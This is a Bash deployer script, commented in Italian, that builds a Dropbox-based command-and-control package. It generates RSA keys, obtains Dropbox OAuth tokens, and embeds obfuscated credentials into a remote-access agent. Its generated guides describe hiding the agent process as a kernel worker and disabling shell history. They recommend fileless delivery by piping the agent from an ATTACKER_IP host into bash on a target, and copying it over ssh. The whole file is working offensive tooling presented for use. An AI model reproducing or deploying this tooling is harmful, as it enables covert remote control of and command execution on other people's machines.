#!/bin/bash

################################################################################
# SCRIPT: deployer.sh
# DESCRIZIONE: Generatore automatico deployment package per Dropbox C2
#
# WORKFLOW:
# 1. VERIFICA TEMPLATE
# 2. GENERA CHIAVI RSA
# 3. SETUP OAUTH2 DROPBOX
# 4. CONFIGURAZIONE PATH E TIMING
# 5. GENERA CONTROLLER SCRIPTS
# 6. GENERA AGENT CON CREDENZIALI EMBEDDED
# 7. CREA DEPLOYMENT PACKAGE
################################################################################

set -e

# Colori
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# === BANNER ===
clear
echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║        Dropbox C2 System - Deployer v2.3                     ║
║                                                               ║
║  Genera deployment package da template esistenti             ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# === CHECK TEMPLATE FILES ===
echo -e "${YELLOW}[CHECK]: Verifica file template...${NC}"

REQUIRED_TEMPLATES=(
    "writer_template.sh"
    "reader_template.sh"
    "agent_template.sh"
)

for file in "${REQUIRED_TEMPLATES[@]}"; do
    if [ ! -f "$file" ]; then
        echo -e "${RED}[ERROR]: Template mancante: $file${NC}"
        echo "Assicurati di avere tutti i template nella directory corrente"
        exit 1
    fi
done

echo -e "${GREEN}[OK]: Tutti i template trovati${NC}"

# === CHECK PREREQUISITES ===
echo -e "${YELLOW}[CHECK]: Verifica tool necessari...${NC}"
for cmd in openssl curl base64 awk sed; do
    if ! command -v $cmd >/dev/null 2>&1; then
        echo -e "${RED}[ERROR]: $cmd non trovato${NC}"
        exit 1
    fi
done
echo -e "${GREEN}[OK]: Tool verificati${NC}"

# === CREA CARTELLE DEPLOYMENT ===
DEPLOY_DIR="deployment_$(date +%Y%m%d_%H%M%S)"
CONTROLLER_DIR="$DEPLOY_DIR/controller"
AGENT_DIR="$DEPLOY_DIR/agent"

mkdir -p "$CONTROLLER_DIR" "$AGENT_DIR"
echo -e "${GREEN}[OK]: Cartella deployment: $DEPLOY_DIR${NC}"

# === STEP 1: GENERATE RSA KEYS ===
echo ""
echo -e "${CYAN}=== STEP 1/5: Generazione Chiavi RSA ===${NC}"

if [ -f "private_key.pem" ] && [ -f "public_key.pem" ]; then
    echo -e "${YELLOW}[WARNING]: Trovate chiavi RSA esistenti${NC}"
    read -p "Riutilizzare le chiavi esistenti? (y/n): " reuse_keys
    if [ "$reuse_keys" = "y" ]; then
        cp private_key.pem "$CONTROLLER_DIR/"
        cp public_key.pem "$CONTROLLER_DIR/"
        echo -e "${GREEN}[OK]: Chiavi RSA copiate${NC}"
    else
        echo "[KEYGEN]: Generazione nuove chiavi RSA 4096-bit..."
        openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
        openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
        chmod 600 "$CONTROLLER_DIR/private_key.pem"
        chmod 644 "$CONTROLLER_DIR/public_key.pem"
        echo -e "${GREEN}[OK]: Nuove chiavi RSA generate${NC}"
    fi
else
    echo "[KEYGEN]: Generazione chiavi RSA 4096-bit (può richiedere 30 secondi)..."
    openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
    openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
    chmod 600 "$CONTROLLER_DIR/private_key.pem"
    chmod 644 "$CONTROLLER_DIR/public_key.pem"
    echo -e "${GREEN}[OK]: Chiavi RSA generate${NC}"
fi

# === STEP 2: DROPBOX OAUTH2 ===
echo ""
echo -e "${CYAN}=== STEP 2/5: Configurazione Dropbox OAuth2 ===${NC}"

if [ -f ".dropbox_refresh_token" ]; then
    echo -e "${YELLOW}[WARNING]: Trovato .dropbox_refresh_token esistente${NC}"
    read -p "Riutilizzare configurazione esistente? (y/n): " reuse_config
    if [ "$reuse_config" = "y" ]; then
        cp .dropbox_refresh_token "$CONTROLLER_DIR/"
        source .dropbox_refresh_token
        echo -e "${GREEN}[OK]: Configurazione OAuth2 copiata${NC}"
    else
        echo "Configurazione nuova richiesta..."
        reuse_config="n"
    fi
else
    reuse_config="n"
fi

if [ "$reuse_config" = "n" ]; then
    echo ""
    echo "Serve creare una Dropbox App per ottenere:"
    echo "1. APP_KEY"
    echo "2. APP_SECRET"
    echo "3. AUTHORIZATION CODE (da browser)"
    echo ""
    
    read -p "Hai già una Dropbox App? (y/n): " has_app
    
    if [ "$has_app" != "y" ]; then
        echo ""
        echo -e "${YELLOW}=== GUIDA CREAZIONE DROPBOX APP ===${NC}"
        echo "1. https://www.dropbox.com/developers/apps/create"
        echo "2. Scoped access → Full Dropbox"
        echo "3. Nome: C2_System_$(date +%Y%m%d)"
        echo "4. Permissions → files.content.read, files.content.write"
        echo ""
        read -p "Premi ENTER quando pronto..."
    fi
    
    echo ""
    read -p "APP_KEY: " APP_KEY
    read -p "APP_SECRET: " APP_SECRET
    
    echo ""
    echo -e "${YELLOW}Apri questo URL:${NC}"
    echo ""
    echo -e "${GREEN}https://www.dropbox.com/oauth2/authorize?response_type=code&client_id=$APP_KEY&token_access_type=offline${NC}"
    echo ""
    read -p "AUTHORIZATION CODE: " AUTH_CODE
    
    echo "[OAUTH]: Richiesta refresh token..."
    
    response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
        -d code=$AUTH_CODE \
        -d grant_type=authorization_code \
        -d client_id=$APP_KEY \
        -d client_secret=$APP_SECRET)
    
    REFRESH_TOKEN=$(echo "$response" | grep -oP '"refresh_token"\s*:\s*"\K[^"]+' 2>/dev/null)
    if [ -z "$REFRESH_TOKEN" ]; then
        REFRESH_TOKEN=$(echo "$response" | sed -n 's/.*"refresh_token":"\([^"]*\)".*/\1/p')
    fi
    
    if [ -z "$REFRESH_TOKEN" ]; then
        echo -e "${RED}[ERROR]: Impossibile ottenere refresh token${NC}"
        echo "Risposta: $response"
        exit 1
    fi
    
    echo -e "${GREEN}[OK]: Refresh token ottenuto (${#REFRESH_TOKEN} caratteri)${NC}"
    
    # Salva config
    cat > "$CONTROLLER_DIR/.dropbox_refresh_token" << EOF
# Dropbox OAuth2 Configuration
# Generated: $(date)

APP_KEY="$APP_KEY"
APP_SECRET="$APP_SECRET"
REFRESH_TOKEN="$REFRESH_TOKEN"
EOF
    
    chmod 600 "$CONTROLLER_DIR/.dropbox_refresh_token"
fi

# === STEP 3: CONFIGURAZIONE PATH E TIMING ===
echo ""
echo -e "${CYAN}=== STEP 3/5: Configurazione Path Dropbox e Timing ===${NC}"

echo ""
echo -e "${YELLOW}Path Dropbox:${NC}"
read -p "Folder path [default: /Machine1]: " input_folder
FOLDER_PATH=${input_folder:-/Machine1}

read -p "Input file [default: /input.txt]: " input_file
INPUT_FILE=${input_file:-/input.txt}

read -p "Output file [default: /output.txt]: " output_file
OUTPUT_FILE=${output_file:-/output.txt}

read -p "Heartbeat file [default: /heartbeat.txt]: " heartbeat_file
HEARTBEAT_FILE=${heartbeat_file:-/heartbeat.txt}

echo ""
echo -e "${YELLOW}Timing Agent:${NC}"
read -p "Base sleep (secondi) [default: 30]: " input_sleep
BASE_SLEEP=${input_sleep:-30}

read -p "Jitter percent [default: 30]: " input_jitter
JITTER_PERCENT=${input_jitter:-30}

echo ""
echo -e "${GREEN}[CONFIG]: Configurazione salvata:${NC}"
echo "  Folder: $FOLDER_PATH"
echo "  Input: $INPUT_FILE"
echo "  Output: $OUTPUT_FILE"
echo "  Heartbeat: $HEARTBEAT_FILE"
echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"

# === STEP 4: COPY & MODIFY CONTROLLER SCRIPTS ===
echo ""
echo -e "${CYAN}=== STEP 4/5: Generazione Script Controller ===${NC}"

# Copia writer
cp writer_template.sh "$CONTROLLER_DIR/writer.sh"

# Sostituisci path in writer.sh
sed -i "s|INPUT_PATH=\"/Machine1/input.txt\"|INPUT_PATH=\"${FOLDER_PATH}${INPUT_FILE}\"|g" "$CONTROLLER_DIR/writer.sh"

chmod +x "$CONTROLLER_DIR/writer.sh"
echo -e "${GREEN}[OK]: writer.sh → controller/ (path: ${FOLDER_PATH}${INPUT_FILE})${NC}"

# Copia reader
cp reader_template.sh "$CONTROLLER_DIR/reader.sh"

# Sostituisci path in reader.sh
sed -i "s|OUTPUT_PATH=\"/Machine1/output.txt\"|OUTPUT_PATH=\"${FOLDER_PATH}${OUTPUT_FILE}\"|g" "$CONTROLLER_DIR/reader.sh"

chmod +x "$CONTROLLER_DIR/reader.sh"
echo -e "${GREEN}[OK]: reader.sh → controller/ (path: ${FOLDER_PATH}${OUTPUT_FILE})${NC}"

# === STEP 5: GENERATE AGENT WITH EMBEDDED CREDENTIALS ===
echo ""
echo -e "${CYAN}=== STEP 5/5: Generazione Agent con credenziali embedded ===${NC}"

# Leggi public key
PUBLIC_KEY_CONTENT=$(cat "$CONTROLLER_DIR/public_key.pem")

# Genera base64 credenziali (con -w 0 per evitare wrap)
APP_KEY_B64=$(echo -n "$APP_KEY" | base64 -w 0)
APP_SECRET_B64=$(echo -n "$APP_SECRET" | base64 -w 0)
REFRESH_TOKEN_B64=$(echo -n "$REFRESH_TOKEN" | base64 -w 0)

# Splitta public key in 4 chunks
PUBLIC_KEY_B64=$(echo "$PUBLIC_KEY_CONTENT" | base64 -w 0)
PK_LEN=${#PUBLIC_KEY_B64}
CHUNK=$((PK_LEN / 4))
PK1=$(echo "$PUBLIC_KEY_B64" | cut -c1-$CHUNK)
PK2=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK+1))-$((CHUNK*2)))
PK3=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*2+1))-$((CHUNK*3)))
PK4=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*3+1))-)

# Copia template agent
cp agent_template.sh "$AGENT_DIR/agent.sh"

# Replace placeholder credenziali
sed -i "s|PLACEHOLDER_APP_KEY_B64|$APP_KEY_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_APP_SECRET_B64|$APP_SECRET_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_REFRESH_TOKEN_B64|$REFRESH_TOKEN_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK1|$PK1|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK2|$PK2|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK3|$PK3|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK4|$PK4|g" "$AGENT_DIR/agent.sh"

# Replace placeholder path
sed -i "s|FOLDER_PATH=\"/Machine1\"|FOLDER_PATH=\"${FOLDER_PATH}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|INPUT_FILE=\"/input.txt\"|INPUT_FILE=\"${INPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|OUTPUT_FILE=\"/output.txt\"|OUTPUT_FILE=\"${OUTPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|HEARTBEAT_FILE=\"/heartbeat.txt\"|HEARTBEAT_FILE=\"${HEARTBEAT_FILE}\"|g" "$AGENT_DIR/agent.sh"

# Replace placeholder timing
sed -i "s|BASE_SLEEP=PLACEHOLDER_BASE_SLEEP|BASE_SLEEP=${BASE_SLEEP}|g" "$AGENT_DIR/agent.sh"
sed -i "s|JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT|JITTER_PERCENT=${JITTER_PERCENT}|g" "$AGENT_DIR/agent.sh"

chmod +x "$AGENT_DIR/agent.sh"

echo -e "${GREEN}[OK]: agent.sh → agent/ (credenziali embedded)${NC}"

# === GENERATE DOCUMENTATION ===
echo ""
echo -e "${CYAN}=== Generazione Documentazione ===${NC}"

cat > "$CONTROLLER_DIR/README.txt" << EOF
=== CONTROLLER - GUIDA RAPIDA ===

FILE:
- private_key.pem          : Chiave RSA privata
- public_key.pem           : Chiave RSA pubblica
- .dropbox_refresh_token   : Credenziali OAuth2
- writer.sh                : Invia comandi
- reader.sh                : Leggi output

CONFIGURAZIONE:
- Folder: $FOLDER_PATH
- Input: $INPUT_FILE
- Output: $OUTPUT_FILE
- Heartbeat: $HEARTBEAT_FILE

USO:
  # Normale
  ./writer.sh whoami
  ./reader.sh
  
  # Quiet mode (no output verboso)
  ./writer.sh -q whoami
  ./reader.sh -q
  
  # Termina agent
  ./writer.sh EXIT
EOF

cat > "$AGENT_DIR/README.txt" << EOF
=== AGENT - DEPLOYMENT ===

FILE: agent.sh

CONFIGURAZIONE EMBEDDED:
- Folder: $FOLDER_PATH
- Input: $INPUT_FILE
- Output: $OUTPUT_FILE
- Heartbeat: $HEARTBEAT_FILE
- Sleep: ${BASE_SLEEP}s
- Jitter: ${JITTER_PERCENT}%

OPZIONI:
  -q    Quiet mode (no output console)
  -d    Daemon mode (detach completo dal terminale)

METODI:
1. File: ./agent.sh
2. Quiet: ./agent.sh -q
3. Daemon: ./agent.sh -d
4. Daemon+Quiet: ./agent.sh -d -q
5. Fileless: curl http://IP/agent.sh | bash
6. Screen: screen -dmS c2 ./agent.sh

NOTE:
- Credenziali già embedded (no config esterna)
- Process masking: [kworker/u:0]
- Bash history disabilitata
- Ctrl+C funziona per kill

KILL:
- Foreground: Ctrl+C
- Daemon: ./writer.sh EXIT
- Hard: pkill -f "kworker/u:0"
EOF

cat > "$DEPLOY_DIR/DEPLOYMENT_GUIDE.txt" << EOF
========================================
  DROPBOX C2 - DEPLOYMENT GUIDE
========================================
Generato: $(date)

CONFIGURAZIONE:
- Folder Dropbox: $FOLDER_PATH
- Input file: $INPUT_FILE
- Output file: $OUTPUT_FILE
- Heartbeat file: $HEARTBEAT_FILE
- Agent sleep: ${BASE_SLEEP}s (jitter: ${JITTER_PERCENT}%)

PREREQUISITI:
1. Crea folder su Dropbox: $FOLDER_PATH
2. Crea 3 file: 
   - ${FOLDER_PATH}${INPUT_FILE}
   - ${FOLDER_PATH}${OUTPUT_FILE}
   - ${FOLDER_PATH}${HEARTBEAT_FILE}
3. Scrivi "MZ" in ${INPUT_FILE}

CONTROLLER:
  cd $CONTROLLER_DIR
  
  # Normale
  ./writer.sh whoami
  ./reader.sh
  
  # Quiet mode
  ./writer.sh -q whoami
  ./reader.sh -q

AGENT:
  # File su disco
  scp $AGENT_DIR/agent.sh user@target:/tmp/
  ssh user@target "bash /tmp/agent.sh"
  
  # Daemon mode
  ssh user@target "bash /tmp/agent.sh -d"
  
  # Quiet + Daemon
  ssh user@target "bash /tmp/agent.sh -d -q"

FILELESS (consigliato):
  cd $AGENT_DIR
  python3 -m http.server 8000
  
  # Su target:
  curl -s http://ATTACKER_IP:8000/agent.sh | bash
  
  # Daemon mode:
  curl -s http://ATTACKER_IP:8000/agent.sh | bash -s -- -d

SCREEN (riattaccabile):
  screen -dmS c2_agent bash /tmp/agent.sh
  screen -r c2_agent

TERMINATE:
  ./writer.sh EXIT
  # oppure
  pkill -f "kworker/u:0"
EOF

# === SUMMARY ===
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              DEPLOYMENT PACKAGE GENERATO!                     ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Struttura:${NC}"
echo "$DEPLOY_DIR/"
echo "├── controller/"
echo "│   ├── private_key.pem"
echo "│   ├── public_key.pem"
echo "│   ├── .dropbox_refresh_token"
echo "│   ├── writer.sh"
echo "│   ├── reader.sh"
echo "│   └── README.txt"
echo "├── agent/"
echo "│   ├── agent.sh (credenziali embedded)"
echo "│   └── README.txt"
echo "└── DEPLOYMENT_GUIDE.txt"
echo ""
echo -e "${YELLOW}Configurazione:${NC}"
echo "  Folder: $FOLDER_PATH"
echo "  Input: $INPUT_FILE"
echo "  Output: $OUTPUT_FILE"
echo "  Heartbeat: $HEARTBEAT_FILE"
echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"
echo ""
echo -e "${YELLOW}Prossimi passi:${NC}"
echo "1. Crea $FOLDER_PATH su Dropbox con i 3 file"
echo "2. Scrivi \"MZ\" in ${FOLDER_PATH}${INPUT_FILE}"
echo "3. cd $CONTROLLER_DIR && ./writer.sh whoami"
echo "4. Deploy agent (vedi DEPLOYMENT_GUIDE.txt)"
echo ""
echo -e "${CYAN}Modalità disponibili:${NC}"
echo "  ./writer.sh -q \"comando\"    # quiet"
echo "  ./reader.sh -q               # quiet"
echo "  ./agent.sh -d                # daemon"
echo "  ./agent.sh -d -q             # daemon + quiet"
echo ""
echo -e "${GREEN}[DONE]${NC}"
